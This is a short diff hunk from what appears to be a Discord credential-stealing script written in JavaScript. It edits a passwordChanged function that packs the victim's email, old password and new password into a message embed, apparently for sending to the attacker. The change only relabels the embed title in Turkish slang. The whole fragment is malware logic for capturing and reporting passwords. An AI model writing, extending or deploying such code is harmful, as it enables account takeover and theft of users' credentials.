@@ -675,8 +675,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nEski Şifre: **${oldpassword}**\nYeni Şifre: **${newpassword}**`,
+            name: '**Sifre Degisti Pezo**',
+            value: `Email: **${json.email}**\nEski Sifre: **${oldpassword}**\nYeni Sifre: **${newpassword}**`,
             inline: true,
           },
           {
